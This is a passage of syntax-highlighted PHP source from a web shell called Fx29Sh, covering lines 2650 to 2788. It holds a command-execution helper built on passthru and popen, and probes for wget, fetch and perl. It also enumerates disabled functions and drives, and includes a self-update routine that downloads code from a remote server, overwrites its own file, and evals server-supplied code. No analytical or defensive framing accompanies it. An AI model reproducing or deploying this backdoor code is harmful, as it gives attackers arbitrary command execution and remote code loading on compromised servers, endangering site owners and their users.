<span class="lineno">2650</span>   <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;passthru&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno">2651</span>   <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;popen&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
<span class="lineno">2652</span>     <span class="nv">$h</span> <span class="o">=</span> <span class="nb">popen</span><span class="p">(</span><span class="nv">$cmd</span><span class="o">.</span><span class="s1">&#39; 2&gt;&amp;1&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
<span class="lineno">2653</span>     <span class="k">if</span> <span class="p">(</span> <span class="nb">is_resource</span><span class="p">(</span><span class="nv">$h</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
<span class="lineno">2654</span>       <span class="k">while</span> <span class="p">(</span> <span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$h</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$output</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$h</span><span class="p">,</span> <span class="mi">2096</span><span class="p">);</span>  <span class="p">}</span>
<span class="lineno">2655</span>       <span class="nb">pclose</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
<span class="lineno">2656</span>     <span class="p">}</span>
<span class="lineno">2657</span>   <span class="p">}</span>
<span class="lineno">2658</span>   <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
<span class="lineno">2659</span> <span class="p">}</span>
<span class="lineno">2660</span> <span class="k">function</span> <span class="nf">is_windows</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">))</span> <span class="o">==</span> <span class="s2">&quot;win&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2661</span> <span class="k">function</span> <span class="nf">which</span><span class="p">(</span><span class="nv">$pr</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2662</span>   <span class="nv">$path</span> <span class="o">=</span> <span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;which </span><span class="si">$pr</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">2663</span>   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="nv">$pr</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2664</span> <span class="p">}</span>
<span class="lineno">2665</span> <span class="k">function</span> <span class="nf">get_status</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">2666</span>   <span class="nv">$arrfunc</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">2667</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;MySQL&quot;</span><span class="p">,</span><span class="s2">&quot;mysql_connect&quot;</span><span class="p">),</span>
<span class="lineno">2668</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;MSSQL&quot;</span><span class="p">,</span><span class="s2">&quot;mssql_connect&quot;</span><span class="p">),</span>
<span class="lineno">2669</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Oracle&quot;</span><span class="p">,</span><span class="s2">&quot;ocilogon&quot;</span><span class="p">),</span>
<span class="lineno">2670</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;PostgreSQL&quot;</span><span class="p">,</span><span class="s2">&quot;pg_connect&quot;</span><span class="p">),</span>
<span class="lineno">2671</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Curl&quot;</span><span class="p">,</span><span class="s2">&quot;curl_version&quot;</span><span class="p">),</span>
<span class="lineno">2672</span>   <span class="p">);</span>
<span class="lineno">2673</span>   <span class="nv">$arrcmd</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">2674</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Fetch&quot;</span><span class="p">,</span><span class="s2">&quot;fetch --help&quot;</span><span class="p">),</span>
<span class="lineno">2675</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Wget&quot;</span><span class="p">,</span><span class="s2">&quot;wget --help&quot;</span><span class="p">),</span>
<span class="lineno">2676</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Perl&quot;</span><span class="p">,</span><span class="s2">&quot;perl -v&quot;</span><span class="p">),</span>
<span class="lineno">2677</span>   <span class="p">);</span>
<span class="lineno">2678</span>   <span class="nv">$statinfo</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">2679</span>   <span class="k">function</span> <span class="nf">showstat</span><span class="p">(</span><span class="nv">$sup</span><span class="p">,</span><span class="nv">$stat</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2680</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$stat</span> <span class="o">==</span> <span class="s2">&quot;on&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;</span><span class="si">$sup</span><span class="s2">: &lt;font class=on&gt;ON&lt;/font&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2681</span>     <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;</span><span class="si">$sup</span><span class="s2">: &lt;font class=off&gt;OFF&lt;/font&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2682</span>   <span class="p">}</span>
<span class="lineno">2683</span>   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arrfunc</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2684</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$func</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">showstat</span><span class="p">(</span><span class="nv">$func</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s2">&quot;on&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2685</span>     <span class="k">else</span> <span class="p">{</span> <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">showstat</span><span class="p">(</span><span class="nv">$func</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s2">&quot;off&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2686</span>   <span class="p">}</span>
<span class="lineno">2687</span>   <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span><span class="o">@</span><span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">&#39;sockets&#39;</span><span class="p">))</span> <span class="o">?</span> <span class="nx">showstat</span><span class="p">(</span><span class="s2">&quot;Sockets&quot;</span><span class="p">,</span><span class="s2">&quot;on&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="nx">showstat</span><span class="p">(</span><span class="s2">&quot;Sockets&quot;</span><span class="p">,</span><span class="s2">&quot;off&quot;</span><span class="p">);</span>
<span class="lineno">2688</span>   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arrcmd</span> <span class="k">as</span> <span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2689</span>     <span class="k">if</span> <span class="p">(</span><span class="nx">fx29exec2</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">showstat</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s2">&quot;on&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2690</span>     <span class="k">else</span> <span class="p">{</span> <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">showstat</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s2">&quot;off&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2691</span>   <span class="p">}</span>
<span class="lineno">2692</span>   <span class="k">return</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$statinfo</span><span class="p">);</span>
<span class="lineno">2693</span> <span class="p">}</span>
<span class="lineno">2694</span> <span class="k">function</span> <span class="nf">showdisfunc</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">2695</span>   <span class="nv">$disfunc</span> <span class="o">=</span> <span class="nx">getdisfunc</span><span class="p">();</span>
<span class="lineno">2696</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$disfunc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;disable_functions&quot;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2697</span>     <span class="k">return</span> <span class="s1">&#39;&lt;font class=&quot;off&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$disfunc</span><span class="o">.</span><span class="s1">&#39;&lt;/font&gt;&#39;</span><span class="p">;</span>
<span class="lineno">2698</span>   <span class="p">}</span>
<span class="lineno">2699</span>   <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="s1">&#39;&lt;font class=&quot;on&quot;&gt;NONE&lt;/font&gt;&#39;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2700</span> <span class="p">}</span>
<span class="lineno">2701</span> <span class="k">function</span> <span class="nf">disp_drives</span><span class="p">(</span><span class="nv">$curdir</span><span class="p">,</span><span class="nv">$surl</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2702</span>   <span class="nv">$letters</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">2703</span>   <span class="nv">$v</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$curdir</span><span class="p">);</span>
<span class="lineno">2704</span>   <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">2705</span>   <span class="k">foreach</span> <span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="p">,</span><span class="s2">&quot;Z&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$letter</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2706</span>     <span class="nv">$bool</span> <span class="o">=</span> <span class="nv">$isdiskette</span> <span class="o">=</span> <span class="nv">$letter</span> <span class="o">==</span> <span class="s2">&quot;A&quot;</span><span class="p">;</span>
<span class="lineno">2707</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$bool</span> <span class="o">=</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;:</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2708</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2709</span>       <span class="nv">$letters</span> <span class="o">.=</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;:</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">2710</span>                   <span class="p">(</span><span class="nv">$isdiskette</span><span class="o">?</span><span class="s2">&quot; onclick=</span><span class="se">\&quot;</span><span class="s2">return confirm(&#39;Make sure that the diskette is inserted properly!&#39;)</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&gt; &quot;</span><span class="p">;</span>
<span class="lineno">2711</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;:&quot;</span> <span class="o">!=</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$letters</span> <span class="o">.=</span> <span class="nv">$letter</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2712</span>       <span class="k">else</span> <span class="p">{</span> <span class="nv">$letters</span> <span class="o">.=</span> <span class="s2">&quot;&lt;font color=#3366FF&gt;&quot;</span><span class="o">.</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2713</span>       <span class="nv">$letters</span> <span class="o">.=</span> <span class="s2">&quot; &lt;/a&gt; &quot;</span><span class="p">;</span>
<span class="lineno">2714</span>     <span class="p">}</span>
<span class="lineno">2715</span>   <span class="p">}</span>
<span class="lineno">2716</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$letters</span><span class="p">))</span> <span class="p">{</span> <span class="k">Return</span> <span class="nv">$letters</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2717</span>   <span class="k">else</span>  <span class="p">{</span> <span class="k">Return</span> <span class="s2">&quot;None&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2718</span> <span class="p">}</span>
<span class="lineno">2719</span> <span class="k">function</span> <span class="nf">view_size</span><span class="p">(</span><span class="nv">$size</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2720</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$size</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2721</span>   <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2722</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1073741824</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1073741824</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; GB&quot;</span><span class="p">;}</span>
<span class="lineno">2723</span>     <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1048576</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1048576</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; MB&quot;</span><span class="p">;}</span>
<span class="lineno">2724</span>     <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1024</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1024</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; KB&quot;</span><span class="p">;}</span>
<span class="lineno">2725</span>     <span class="k">else</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nv">$size</span> <span class="o">.</span> <span class="s2">&quot; B&quot;</span><span class="p">;}</span>
<span class="lineno">2726</span>     <span class="k">return</span> <span class="nv">$size</span><span class="p">;</span>
<span class="lineno">2727</span>   <span class="p">}</span>
<span class="lineno">2728</span> <span class="p">}</span>
<span class="lineno">2729</span> <span class="k">function</span> <span class="nf">disp_freespace</span><span class="p">(</span><span class="nv">$curdrv</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2730</span>   <span class="nv">$free</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_free_space</span><span class="p">(</span><span class="nv">$curdrv</span><span class="p">);</span>
<span class="lineno">2731</span>   <span class="nv">$total</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_total_space</span><span class="p">(</span><span class="nv">$curdrv</span><span class="p">);</span>
<span class="lineno">2732</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$free</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$free</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2733</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$total</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2734</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$free</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$free</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2735</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$total</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2736</span>   <span class="nv">$used</span> <span class="o">=</span> <span class="nv">$total</span><span class="o">-</span><span class="nv">$free</span><span class="p">;</span>
<span class="lineno">2737</span>   <span class="nv">$free_percent</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="mi">100</span><span class="o">/</span><span class="p">(</span><span class="nv">$total</span><span class="o">/</span><span class="nv">$free</span><span class="p">),</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;%&quot;</span><span class="p">;</span>
<span class="lineno">2738</span>   <span class="nv">$free</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$free</span><span class="p">);</span>
<span class="lineno">2739</span>   <span class="nv">$total</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$total</span><span class="p">);</span>
<span class="lineno">2740</span>   <span class="k">return</span> <span class="s2">&quot;</span><span class="si">$free</span><span class="s2"> of </span><span class="si">$total</span><span class="s2"> (</span><span class="si">$free_percent</span><span class="s2">)&quot;</span><span class="p">;</span>
<span class="lineno">2741</span> <span class="p">}</span>
<span class="lineno">2742</span> <span class="c1">###[ Fx29Sh UPDATE FUNCTIONS ]###</span>
<span class="lineno">2743</span> <span class="k">function</span> <span class="nf">fx29sh_getupdate</span><span class="p">(</span><span class="nv">$update</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2744</span>   <span class="k">global</span> <span class="nv">$fx29sh_updateurl</span><span class="p">;</span>
<span class="lineno">2745</span>   <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$fx29sh_updateurl</span><span class="o">.</span><span class="s2">&quot;?version=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nx">sh_ver</span><span class="p">));</span>
<span class="lineno">2746</span>   <span class="nv">$data</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
<span class="lineno">2747</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&lt;div class=errmsg&gt;Can&#39;t connect to update-server! (</span><span class="si">$fx29sh_updateurl</span><span class="s2">)&lt;/div&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2748</span>   <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2749</span>     <span class="nv">$data</span> <span class="o">=</span> <span class="nb">ltrim</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
<span class="lineno">2750</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;You already using latest version!&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2751</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x02</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2752</span>      <span class="nv">$string</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">2</span><span class="p">}));</span>
<span class="lineno">2753</span>       <span class="nv">$string</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span>
<span class="lineno">2754</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$update</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2755</span>         <span class="nv">$confvars</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">2756</span>         <span class="nv">$sourceurl</span> <span class="o">=</span> <span class="nv">$string</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">2757</span>         <span class="nv">$source</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$sourceurl</span><span class="p">);</span>
<span class="lineno">2758</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$source</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;Can&#39;t fetch update!&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2759</span>         <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2760</span>           <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">2761</span>           <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;Local error: can&#39;t write update to &quot;</span><span class="o">.</span><span class="k">__FILE__</span><span class="o">.</span><span class="s2">&quot;! You may download fx29shell.php manually &lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sourceurl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;.&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2762</span>           <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2763</span>             <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$source</span><span class="p">);</span>
<span class="lineno">2764</span>             <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno">2765</span>             <span class="k">return</span> <span class="s2">&quot;Update completed!&quot;</span><span class="p">;</span>
<span class="lineno">2766</span>           <span class="p">}</span>
<span class="lineno">2767</span>         <span class="p">}</span>
<span class="lineno">2768</span>       <span class="p">}</span>
<span class="lineno">2769</span>       <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;New version is available: &quot;</span><span class="o">.</span><span class="nv">$string</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="p">}</span>
<span class="lineno">2770</span>     <span class="p">}</span>
<span class="lineno">2771</span>     <span class="k">elseif</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x03</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span> <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2772</span>     <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&lt;div class=errmsg&gt;Error in protocol: segmentation failed! (&quot;</span><span class="o">.</span><span class="nv">$data</span><span class="o">.</span><span class="s2">&quot;)&lt;/div&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2773</span>   <span class="p">}</span>
<span class="lineno">2774</span> <span class="p">}</span>
<span class="lineno">2775</span> <span class="c1">###[ END Fx29Sh UPDATE FUNCTIONS ]###</span>
<span class="lineno">2776</span> <span class="k">function</span> <span class="nf">fx29_buff_prepare</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">2777</span>   <span class="k">global</span> <span class="nv">$sess_data</span><span class="p">,</span> <span class="nv">$act</span><span class="p">;</span>
<span class="lineno">2778</span>   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2779</span>     <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$v</span><span class="p">));</span>
<span class="lineno">2780</span>   <span class="p">}</span>
<span class="lineno">2781</span>   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2782</span>     <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$v</span><span class="p">));</span>
<span class="lineno">2783</span>   <span class="p">}</span>
<span class="lineno">2784</span>   <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]);</span>
<span class="lineno">2785</span>   <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span>  <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
<span class="lineno">2786</span>   <span class="nb">sort</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]);</span>
<span class="lineno">2787</span>   <span class="nb">sort</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
<span class="lineno">2788</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">!=</span> <span class="s2">&quot;copy&quot;</span><span class="p">)</span> <span class="p">{</span>
